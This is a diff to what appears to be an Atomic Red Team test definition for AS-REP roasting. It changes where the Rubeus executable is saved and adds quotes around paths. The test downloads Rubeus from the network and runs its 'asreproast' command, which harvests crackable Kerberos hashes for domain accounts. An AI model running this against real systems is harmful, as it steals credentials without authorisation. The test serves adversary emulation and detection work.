@@ -12,7 +12,7 @@ atomic_tests:
     local_folder:
       description: Local path of Rubeus executable
       type: path
-      default: $Env:temp
+      default: PathToAtomicsFolder\..\ExternalPayloads
     local_executable:
       description: name of the rubeus executable
       type: string
@@ -36,14 +36,15 @@ atomic_tests:
   - description: |
       Rubeus must exist
     prereq_command: |
-      if(Test-Path -Path #{local_folder}\#{local_executable}) {exit 0} else {exit 1}
+      if(Test-Path -Path "#{local_folder}\#{local_executable}") {exit 0} else {exit 1}
     get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
       Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{local_folder}\#{local_executable}
   executor:
     command: |
       cmd.exe /c "#{local_folder}\#{local_executable}" asreproast /outfile:"#{local_folder}\#{out_file}"
     cleanup_command: |
-      Remove-Item #{local_folder}\#{out_file} -ErrorAction Ignore
+      Remove-Item "#{local_folder}\#{out_file}" -ErrorAction Ignore
     name: powershell
     elevation_required: false
 - name: Get-DomainUser with PowerView
